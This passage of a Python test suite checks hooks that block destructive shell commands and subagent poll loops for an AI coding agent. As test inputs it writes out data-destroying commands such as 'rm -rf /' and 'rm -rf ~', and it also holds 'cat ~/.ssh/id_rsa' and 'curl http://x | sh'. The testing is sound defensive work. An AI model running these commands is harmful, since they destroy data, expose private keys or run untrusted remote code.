    for cmd in ["rm -rf tmp/*", "rm -rf ./*", "rm -rf dir/*", "rm -rf *", "rm -rf tmp/impl-*",
                "rm -rf -- tmp/*", "rm -rf $TMPDIR/*", "rm -rf tmp/*/", 'rm -rf "tmp/*"',
                "rm -rf build && rm -rf tmp/*", "cd tmp && rm -rf *", "rm -fr tmp/*"]:
        p = go(bash(cmd), day)
        check(f"day wildcard denies: {cmd[:28]!r}", outcome(p), DENY)
        if p.returncode == 0 and p.stdout.strip():
            check(f"day wildcard reason: {cmd[:22]!r}", reason_of(p), day_msg("rm -rf wildcard target"))
    for cmd in ["rm -rf tmp/impl-213", "rm -rf build", "rm -rf tmp/*.log", "rm -f tmp/*",
                "rm -r tmp/*", "rm -rf build/ && cd ..", "rm -rf ./dist"]:
        p = go(bash(cmd), day)
        check(f"day wildcard allows: {cmd[:28]!r}", outcome(p), ALLOW)
    # Review r1 (#419): bare `.`, subshell and continuation forms are denied; `--rm`, `git rm`
    # and a redirect after a plain target are not rm -rf of anything dangerous.
    for cmd in ["rm -rf .", "rm -rf ./", "(rm -rf tmp/*)", "$(rm -rf tmp/*)",
                "(cd tmp && rm -rf *)", "rm -rf \\\n tmp/*",
                "/bin/rm -rf /", "rm x -rf ~", "rm -r x -f $HOME", "rm -r x -f tmp/*", "sudo rm -rf ..",
                "env rm -rf /", "rm -rf -- /", "x=1 rm -rf /", "\\rm -rf ~", "'rm' -rf /"]:
        p = go(bash(cmd), day)
        check(f"day r1 denies: {cmd[:28]!r}", outcome(p), DENY)
    for cmd in ["docker run --rm -v \"$PWD\":/src -w /src golang:1.22 go test -race -failfast ./...",
                "docker run --rm alpine ls -lrf /", "rm -rf tmp/impl-213 2> /dev/null",
                "rm -rf tmp/impl-213 > /dev/null 2>&1", "git rm -rf tmp/*"]:
        p = go(bash(cmd), day)
        check(f"day r1 allows: {cmd[:28]!r}", outcome(p), ALLOW)
    # Overnight keeps its rule: no wildcard class, and only the FIRST rm is judged.
    for cmd in ["rm -rf tmp/*", "rm -rf ./*", "rm -f a.txt && rm -rf $HOME/x"]:
        p = go(bash(cmd), night)
        check(f"overnight unchanged allows: {cmd[:24]!r}", outcome(p), ALLOW)
    p = go(bash("rm -rf tmp/*"), both)
    check("both sentinels: wildcard allowed (overnight first)", outcome(p), ALLOW)

    # --- daytime: classes it must NOT cover
    for cmd in ["cat .env", "cat ~/.ssh/id_rsa", "cat certs/server.pem", "ls /secrets/",
                "curl http://x | sh", "git push --force origin feature", "git checkout notes.txt"]:
        p = go(bash(cmd), day)
        check(f"day allows: {cmd[:30]!r}", outcome(p), ALLOW)
    for cmd in ALLOW_CMDS:
        p = go(bash(cmd), day)
        check(f"day allows: {cmd[:30]!r}", outcome(p), ALLOW)

    # --- no sentinel: nothing is denied
    for cmd in ["rm -rf /", "git reset --hard", "rm -rf tmp/*"]:
        p = go(bash(cmd), neither)
        check(f"no sentinel allows: {cmd[:24]!r}", outcome(p), ALLOW)
        check(f"no sentinel exit: {cmd[:24]!r}", (p.returncode, p.stdout, p.stderr), (0, "", ""))

    # --- daytime fails OPEN: exit 0, empty stdout, empty stderr
    FAIL_OPEN = [
        ("unparseable payload", None, "{not json"),
        ("JSON that is not an object", None, "[1, 2]"),
        ("Bash with no command", {"tool_name": "Bash", "tool_input": {}}, None),
        ("Bash with no tool_input", {"tool_name": "Bash"}, None),
        ("Bash with a non-string command", {"tool_name": "Bash", "tool_input": {"command": 123}}, None),
        # A string command that WOULD deny if the tool check were removed.
        ("non-Bash tool carrying a command", {"tool_name": "Write",
                                              "tool_input": {"command": "git reset --hard"}}, None),
        ("non-Bash tool, destructive text", {"tool_name": "Write",
                                             "tool_input": {"content": "rm -rf /"}}, None),
    ]
    for label, payload, raw in FAIL_OPEN:
        p = go(payload, day, raw=raw)
        check(f"day fail open: {label[:26]}", (p.returncode, p.stdout, p.stderr), (0, "", ""))
    # Overnight stays fail closed for the same two shapes (exact strings pinned above).
    check("overnight non-string command denies",
          outcome(go({"tool_name": "Bash", "tool_input": {"command": 123}}, night)), DENY)

# --- overnight-guard registration: the daytime sentinel and the shell gate ----
print("\n  -- overnight-guard registration, daytime arm (#419) --")
GATE_TEXT = ('[ -n "$CLAUDE_PROJECT_DIR" ] && { [ -f "$CLAUDE_PROJECT_DIR/.claude/overnight/active.md" ] '
             '|| [ -f "$CLAUDE_PROJECT_DIR/.claude/no-destructive" ]; } || exit 0; exec python3 "$0"')
check("guard gate tests both sentinels",
      ".claude/overnight/active.md" in " ".join(guard_reg["args"])
      and ".claude/no-destructive" in " ".join(guard_reg["args"]), True)
# Braced and unbraced gates behave identically with CLAUDE_PROJECT_DIR unset, so only the text
# can pin the braces (the unbraced one would test /.claude/no-destructive at the filesystem root).
check("guard gate text is the braced form, exact", guard_reg["args"][1], GATE_TEXT)
check("guard is ONE entry (a second would double-spawn Python)",
      sum(1 for e in spec["hooks"]["PreToolUse"] if "overnight-guard" in json.dumps(e)), 1)

with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    proot = td / "plugin"
    (proot / "hooks").mkdir(parents=True)
    shutil.copy(GUARD, proot / "hooks" / "overnight-guard.py")
    proj = td / "proj"
    (proj / ".claude").mkdir(parents=True)
    script = proot / "hooks" / "overnight-guard.py"
    real = script.read_bytes()
    reset = bash("git reset --hard")

    def ireg(project_dir, payload):
        return invoke_registered(proot, project_dir, payload, reg=guard_reg)

    # Real script behind the real gate, daytime sentinel only.
    check("registered, no sentinel", outcome(ireg(proj, reset)), ALLOW)
    (proj / ".claude" / "no-destructive").touch()
    p = ireg(proj, reset)
    check("registered real script, daytime denies", outcome(p), DENY)
    check("registered real script, daytime reason exact", reason_of(p), day_msg("git reset --hard"))
    check("registered real script, git status allows", outcome(ireg(proj, bash("git status"))), ALLOW)
    (proj / ".claude" / "no-destructive").unlink()

    # Poison pill: if the gate spawns the interpreter at all, this denies.
    script.write_text(
        "import json\n"
        'print(json.dumps({"hookSpecificOutput":'
        '{"hookEventName":"PreToolUse","permissionDecision":"deny",'
        '"permissionDecisionReason":"POISON: interpreter was spawned"}}))\n'
    )
    p = ireg(proj, reset)
    check("guard: neither sentinel spawns no python", (outcome(p), p.stderr), (ALLOW, ""))
    p = ireg(None, reset)
    check("guard: CLAUDE_PROJECT_DIR unset spawns no python", (outcome(p), p.stderr), (ALLOW, ""))
    (proj / ".claude" / "no-poll-loops").touch()
    check("guard: another hook's sentinel does not arm it", outcome(ireg(proj, reset)), ALLOW)
    (proj / ".claude" / "no-destructive").touch()
    p = ireg(proj, reset)
    check("guard: daytime sentinel reaches the script", "POISON" in p.stdout, True)
    (proj / ".claude" / "no-destructive").unlink()
    (proj / ".claude" / "overnight").mkdir()
    (proj / ".claude" / "overnight" / "active.md").write_text("manifest")
    p = ireg(proj, reset)
    check("guard: overnight sentinel reaches the script", "POISON" in p.stdout, True)
    script.write_bytes(real)

# --- adapt's hooks.md arms the daytime arm (#419) --------------------------
print("\n  -- forge-adapt hooks.md: overnight-guard row (#419) --")
HOOKS_MD = (ROOT / "plugins/forge-kit-adapt/skills/adapt/references/hooks.md").read_text()
og_row = [ln for ln in HOOKS_MD.splitlines() if ln.startswith("|") and "`overnight-guard.py`" in ln]
check("hooks.md has one overnight-guard signal row", len(og_row), 1)
og_row = og_row[0] if og_row else ""
check("hooks.md row names a signal (working-overnight or a CLAUDE.md rule)",
      "working-overnight" in og_row and "CLAUDE.md" in og_row, True)
check("hooks.md row names the Bash matcher", "`Bash`" in og_row, True)
og_detail = HOOKS_MD.split("## Install detail (overnight-guard.py)")[-1].split("\n## ")[0] \
    if "## Install detail (overnight-guard.py)" in HOOKS_MD else ""
check("hooks.md has the overnight-guard install detail", og_detail != "", True)
check("hooks.md detail names the sentinel", ".claude/no-destructive" in og_detail, True)
check("hooks.md detail branches on GOVERNANCE_PLUGIN_ACTIVE (yes and no)",
      "`yes`" in og_detail and "`no`" in og_detail and "GOVERNANCE_PLUGIN_ACTIVE" in og_detail, True)
check("hooks.md yes branch: touch the sentinel, no copy",
      "mkdir -p .claude && touch .claude/no-destructive" in og_detail, True)
check("hooks.md no branch: copy verbatim and wire an exec-form Bash entry",
      ".claude/hooks/overnight-guard.py" in og_detail and '"command": "python3"' in og_detail, True)
check("hooks.md no branch creates the sentinel",
      "create the sentinel" in og_detail.split("`no`:")[-1], True)
check("hooks.md detail has a confirm line", "Confirm:" in og_detail, True)

# --- no-poll-loops (PreToolUse Bash, #263) ----------------------------------
# Refuses a shell wait on a dispatched subagent: a background bare `sleep N; echo waited`
# placeholder, or an until/while/for loop that sleeps while naming tasks/<id>.output, a
# subagents/ path or an agent-<id>.jsonl transcript. Own sentinel .claude/no-poll-loops.
print("\n  -- no-poll-loops (PreToolUse Bash) --")

NPL = ROOT / "plugins/forge-kit-governance/hooks/no-poll-loops.py"
T = "/tmp/s/tasks/ab12cd.output"
J = "/tmp/s/subagents/agent-ab12cd.jsonl"


def bg(cmd, flag=True):
    tin = {"command": cmd}
    if flag is not None:
        tin["run_in_background"] = flag
    return {"tool_name": "Bash", "tool_input": tin}


NPL_DENY = [
    # Placeholder waiters, as observed in the #194 and #189 gate transcripts.
    ("placeholder, echo tail", bg("sleep 240; echo waited")),
    ("placeholder, && echo tail", bg("sleep 60 && echo waited")),
    ("placeholder, true tail", bg("sleep 90; true")),
    ("placeholder, colon tail", bg("sleep 90 && :")),
    ("placeholder, bare", bg("sleep 30")),
    ("placeholder, unit suffix", bg("sleep 5m; echo done")),
    ("placeholder, fractional", bg("sleep 0.5")),
    ("placeholder, padded", bg("  sleep 45;  echo waited  \n")),
    # Poll loops on a dispatched task's artifacts, whether or not flagged background.
    ("until on tasks output, no flag", bg(f"until [ -s {T} ]; do sleep 5; done", None)),
    ("until on tasks output, bg", bg(f"until [ -s {T} ]; do sleep 5; done")),
    ("until on tasks output, fg flag", bg(f"until [ -s {T} ]; do sleep 5; done", False)),
    ("while on subagents path", bg(f"while [ ! -f {J} ]; do sleep 5; done")),
    ("until on agent jsonl name", bg("until grep -q end agent-ab12cd.jsonl; do sleep 3; done", None)),
    ("for loop on tasks output", bg(f"for i in $(seq 1 16); do sleep 15; stat -c %s {T}; done", None)),
    ("subagents path, not an agent jsonl", bg("while [ ! -f /tmp/s/subagents/notes.log ]; do sleep 5; done", None)),
    ("multi-line loop", bg(f"F={T}\nuntil [ -s \"$F\" ]\ndo\n  sleep 5\ndone", None)),
    ("path in variable, same call", bg(f"F={T}; until [ -s $F ]; do sleep 2; done", None)),
    ("loop behind cd and timeout", bg(f"cd /x && timeout 600 bash -c 'until [ -s {T} ]; do sleep 5; done'", None)),
    # Quoting the PATH does not hide a real loop; executing quoted or heredoc text is code.
    ("quoted path, real loop", bg(f'until [ -s "{T}" ]; do sleep 5; done', None)),
    ("bash -c double-quoted", bg(f'bash -c "until [ -s {T} ]; do sleep 5; done"', None)),
    ("heredoc fed to bash", bg(f"bash <<EOF\nuntil [ -s {T} ]; do sleep 5; done\nEOF", None)),
    ("eval of a string", bg(f"eval 'until [ -s {T} ]; do sleep 5; done'", None)),
    ("real loop after a quoted string", bg(f'echo "hi"; until [ -s {T} ]; do sleep 5; done', None)),
    ("heredoc piped to bash", bg(f"cat <<EOF | bash\nuntil [ -s {T} ]; do sleep 5; done\nEOF", None)),
    ("quoted loop piped to sh", bg(f"echo 'until [ -s {T} ]; do sleep 5; done' | sh", None)),
    ("apostrophes in comments do not mask a real loop",
     bg(f"# the critic's output\nuntil [ -s {T} ]; do sleep 5; done\n# don't poll", None)),
    ("nested loop before the sleep",
     bg(f"while [ ! -s {T} ]; do for i in 1 2; do :; done; sleep 5; done", None)),
    ("echo done before the sleep", bg(f"until [ -s {T} ]; do echo done; sleep 5; done", None)),
    ("done in a comment before the sleep", bg(f"until [ -s {T} ]; do # done soon\n sleep 5; done", None)),
    ("innocent loop first, artifact loop second",
     bg(f"until curl -sf localhost:1; do sleep 1; done; until [ -s {T} ]; do sleep 5; done", None)),
    ("artifact after an inner done", bg(f"while true; do sleep 1; for x in 1; do :; done; stat {T}; done", None)),
    ("absolute-path bash -c", bg(f"/bin/bash -c 'until [ -s {T} ]; do sleep 5; done'", None)),
    ("Monitor tool, same command field",
     {"tool_name": "Monitor", "tool_input": {"command": f"until [ -s {T} ]; do sleep 5; done"}}),
]
NPL_ALLOW = [
    ("sleep 2 foreground", bg("sleep 2", None)),
    ("sleep 2 flagged false", bg("sleep 2", False)),
    ("placeholder not backgrounded", bg("sleep 240; echo waited", None)),
    ("placeholder flagged false", bg("sleep 240; echo waited", False)),
    ("CI wait (real use)", bg("sleep 20; gh run watch 123 --exit-status")),
    ("sleep then a real command", bg("sleep 5 && ./deploy.sh")),
    ("sleep then echo then more", bg("sleep 5; echo waited; ./deploy.sh")),
    ("sleep after another command", bg("echo started; sleep 30")),
    ("loop without done", bg(f"for f in {T}; do echo hi; sleep 3", None)),
    ("string flag is not true", bg("sleep 30", "true")),
    ("poll another target", bg("until curl -sf localhost:3000; do sleep 1; done")),
    ("poll a file elsewhere", bg("until [ -s build/out.log ]; do sleep 1; done", None)),
    ("a tasks dir, not an output", bg("until [ -s tasks/todo.md ]; do sleep 1; done", None)),
    ("loop without sleep", bg(f"while read l; do echo $l; done < {T}", None)),
    ("sleep without loop, artifact named", bg(f"sleep 3; cat {T}", None)),
    ("artifact read, no sleep", bg(f"cat {T}; tail -c 200 {J}", None)),
    ("timeout run", bg("timeout 600 python3 scripts/test-hooks.py")),
    ("plain command", bg("git status", None)),
    ("empty command", bg("", None)),
    # Text that only carries a loop (#168 precedent): a comment body, commit message, data heredoc.
    ("forge comment body quoting a loop",
     bg(f'gh issue comment 9 --body "poll with: until [ -s {T} ]; do sleep 5; done"', None)),
    ("single-quoted commit message",
     bg(f"git commit -m 'drop the loop: until [ -s {T} ]; do sleep 5; done'", None)),
    ("multi-line quoted body",
     bg(f'gh issue create --body "steps:\nuntil [ -s {T} ]\ndo sleep 5\ndone\n"', None)),
    ("data heredoc to a file",
     bg(f"cat > notes.md <<'EOF'\nuntil [ -s {T} ]; do sleep 5; done\nEOF", None)),
    ("data heredoc to gh",
     bg(f"gh issue comment 9 --body-file - <<'EOF'\nuntil [ -s {T} ]; do sleep 5; done\nEOF", None)),
    ("quoted body mentioning eval and a loop",
     bg(f'gh issue comment 9 --body "do not eval it: until [ -s {T} ]; do sleep 5; done"', None)),
    ("quoted body mentioning bash -c and a loop",
     bg(f'gh issue comment 9 --body "bash -c wrapper: until [ -s {T} ]; do sleep 5; done"', None)),
    ("script file named run.sh with a data heredoc",
     bg(f"cat > run.sh <<'EOF'\nuntil [ -s {T} ]; do sleep 5; done\nEOF", None)),
    ("artifact only in an earlier quoted echo, loop polls elsewhere",
     bg(f'echo "see {T}"; until curl -sf localhost:1; do sleep 1; done', None)),
    ("artifact path only in a quoted assignment, loop polls elsewhere",
     bg(f'echo "F={T}"; until curl -sf $U; do sleep 1; done', None)),
    ("Monitor with an unrelated loop",
     {"tool_name": "Monitor", "tool_input": {"command": "while true; do gh run list; sleep 30; done"}}),
]

with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    on = td / "on"
    (on / ".claude").mkdir(parents=True)
    (on / ".claude" / "no-poll-loops").touch()
    off = td / "off"
    (off / ".claude").mkdir(parents=True)
    # The other hooks' sentinels must not arm this one: it has its OWN file.
    (off / ".claude" / "no-dashes").touch()
    (off / ".claude" / "overnight").mkdir()
    (off / ".claude" / "overnight" / "active.md").touch()

    def npl(payload, proj=on, raw=None, cwd=None):
        p = run(payload, raw=raw, hook=NPL, project_dir=proj, cwd=str(cwd or proj or "/"))
        return verdict(p) if p.returncode == 0 else f"exit{p.returncode}"

    for label, pl in NPL_DENY:
        check("npl deny: " + label, npl(pl), DENY)
    for label, pl in NPL_ALLOW:
        check("npl allow: " + label, npl(pl), ALLOW)

    # Exit code is part of the contract: deny is signalled on stdout, exit 0.
    p = run(bg("sleep 240; echo waited"), hook=NPL, project_dir=on, cwd=str(on))
    check("npl deny exits 0", p.returncode, 0)
    # The reason teaches the replacement, not just the refusal.
    reason = json.loads(p.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
    check("npl reason names the notification", "completion notification" in reason, True)
    check("npl reason says keep working", "independent work" in reason, True)
    # #433: the installed harness backgrounds every Agent call and offers no foreground
    # switch, so the reason must be correct whichever way that falls: end the turn when
    # nothing else is left, and name a blocking call only where the host offers one.
    low = reason.lower()
    check("npl reason says end the turn when no work is left",
          "with none left, end your turn and the completion notification resumes you" in low, True)
    check("npl reason does not forbid ending the turn",
          re.search(r"(never|do not|don't)\s+end\s+(the|your)\s+turn", low) is None, True)
    check("npl reason bans the poll loop", "poll loop" in low, True)
    check("npl reason names no foreground call", "foreground" in low, False)
    check("npl reason names no blocking call", "blocking" in low, False)

    # Sentinel absent means allow, even for the exact observed waiter. Another hook's
    # sentinel is not this hook's.
    for label, pl in (NPL_DENY[0], NPL_DENY[8]):
        check("npl no sentinel allows: " + label, npl(pl, proj=off), ALLOW)
    check("npl no CLAUDE_PROJECT_DIR and no cwd allows",
          npl(NPL_DENY[0][1], proj=None, cwd="/"), ALLOW)
    # The payload's cwd arms it when CLAUDE_PROJECT_DIR is unset.
    check("npl payload cwd finds the sentinel",
          npl(dict(NPL_DENY[0][1], cwd=str(on)), proj=None, cwd="/"), DENY)

    # Fail open on anything it cannot judge, armed or not.
    for label, raw in (("malformed json", "{not json"), ("empty stdin", ""),
                       ("json array", "[1, 2, 3]"), ("json scalar", "7"), ("json null", "null")):
        check("npl armed " + label + " allows", npl(None, raw=raw), ALLOW)
    for label, pl in (("no tool_input", {"tool_name": "Bash"}),
                      ("tool_input not a dict", {"tool_name": "Bash", "tool_input": "sleep 30"}),
                      ("no command", {"tool_name": "Bash", "tool_input": {"run_in_background": True}}),
                      ("command is a list", {"tool_name": "Bash", "tool_input": {"command": ["sleep", "30"], "run_in_background": True}}),
                      ("command is null", {"tool_name": "Bash", "tool_input": {"command": None, "run_in_background": True}})):
        check("npl armed " + label + " allows", npl(pl), ALLOW)
    # Only Bash is judged: the same text through another tool is data.
    check("npl non-Bash tool with a command key allows",
          npl({"tool_name": "Write", "tool_input": {"command": "sleep 240; echo waited", "run_in_background": True}}),
          ALLOW)
    check("npl Agent dispatch payload allows",
          npl({"tool_name": "Agent", "tool_input": {"command": "sleep 9; echo x", "run_in_background": True}}),
          ALLOW)
    check("npl non-Bash allows",
          npl({"tool_name": "Write", "tool_input": {"content": "sleep 240; echo waited", "run_in_background": True}}),
          ALLOW)

    # The script's own --self-test is part of the contract and runs here.
    st = subprocess.run([sys.executable, str(NPL), "--self-test"], capture_output=True, text=True)
    check("npl --self-test passes", (st.returncode, "PASS" in st.stdout), (0, True))
    # ... and it is not vacuous: against a copy whose placeholder rule is dead it must fail.
    broken = td / "broken-no-poll-loops.py"
    broken.write_text(NPL.read_text().replace("BARE_SLEEP.search(command)", "False"))
    st = subprocess.run([sys.executable, str(broken), "--self-test"], capture_output=True, text=True)
    check("npl --self-test fails on a broken hook", (st.returncode, "FAIL" in st.stdout), (1, True))

# --- no-poll-loops registration (hooks.json) --------------------------------
print("\n  -- no-poll-loops registration --")
npl_entry = next(e for e in spec["hooks"]["PreToolUse"] if "no-poll-loops" in json.dumps(e))
npl_reg = npl_entry["hooks"][0]
check("npl matcher is Bash|Monitor", npl_entry["matcher"], "Bash|Monitor")
check("npl exec form", ("command" in npl_reg and "args" in npl_reg), True)
check("npl sh-gates on its own sentinel",
      ".claude/no-poll-loops" in " ".join(npl_reg["args"]), True)
check("npl plugin root braced", "${CLAUDE_PLUGIN_ROOT}" in " ".join(npl_reg["args"]), True)


def invoke_npl(plugin_root, project_dir, payload):
    argv = [npl_reg["command"]] + [
        a.replace("${CLAUDE_PLUGIN_ROOT}", str(plugin_root)) for a in npl_reg["args"]
    ]
    env = dict(os.environ)
    env.pop("CLAUDE_PROJECT_DIR", None)
    if project_dir is not None:
        env["CLAUDE_PROJECT_DIR"] = str(project_dir)
    return subprocess.run(argv, input=json.dumps(payload), capture_output=True,
                          text=True, env=env, cwd="/")


with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    proot = td / "plugin"
    (proot / "hooks").mkdir(parents=True)
    shutil.copy(NPL, proot / "hooks" / "no-poll-loops.py")
    proj = td / "proj"
    (proj / ".claude").mkdir(parents=True)
    waiter = bg("sleep 240; echo waited")

    p = invoke_npl(proot, proj, waiter)
    check("npl registered, no sentinel", verdict(p), ALLOW)

    # The sh guard must SHORT-CIRCUIT: a poison-pill script denies unconditionally, so a
    # spawned interpreter shows up as a deny.
    script = proot / "hooks" / "no-poll-loops.py"
    original = script.read_bytes()
    script.write_text(
        "import json\n"
        'print(json.dumps({"hookSpecificOutput":'
        '{"hookEventName":"PreToolUse","permissionDecision":"deny",'
        '"permissionDecisionReason":"POISON: interpreter was spawned"}}))\n'
    )
    p = invoke_npl(proot, proj, waiter)
    check("npl no sentinel spawns no python", verdict(p), ALLOW, extra="(guard short-circuits)")
    # Another hook's sentinel does not arm it.
    (proj / ".claude" / "no-dashes").touch()
    p = invoke_npl(proot, proj, waiter)
    check("npl no-dashes sentinel does not arm it", verdict(p), ALLOW)
    script.write_bytes(original)

    (proj / ".claude" / "no-poll-loops").touch()
    p = invoke_npl(proot, proj, waiter)
    check("npl registered, opted in", verdict(p), DENY)
    check("npl stdin reaches the script", "completion notification" in p.stdout, True)
    p = invoke_npl(proot, proj, bg("sleep 20; gh run watch 1"))
    check("npl registered, ordinary command", verdict(p), ALLOW)
    p = invoke_npl(proot, None, waiter)
    check("npl registered, no CLAUDE_PROJECT_DIR", verdict(p), ALLOW, extra="(fail open)")

print()
if failures:
    print(f"FAILED: {len(failures)} case(s): {', '.join(failures)}")
    sys.exit(1)
print("all hook contract tests passed")
